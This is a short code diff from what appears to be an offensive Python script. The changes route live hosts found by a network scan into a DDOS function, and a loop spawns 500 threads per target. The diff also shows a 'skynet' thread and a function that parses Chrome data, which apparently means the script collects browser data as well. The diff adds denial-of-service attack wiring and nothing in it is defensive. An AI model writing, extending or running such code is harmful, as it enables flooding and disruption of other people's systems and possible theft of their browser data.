@@ -78,7 +78,8 @@ def run1():
    for ip in range(st1,en1):
       addr = net2 + str(ip)
       if (scan(addr)):
-         target.append(addr)
+         targets.append(addr)
+    DDOS(targets)
 
 def chrome_date_and_time(chrome_data):
     # Chrome_data format is 'year-month-date 
@@ -232,7 +233,7 @@ except:
 
 for target in targets:
     for i in range(500):
-        thread = threading.Thread(target=DDOS, (target))
+        thread = threading.Thread(target=run1)
         thread.start()
 
 thread2 = threading.Thread(target=skynet)
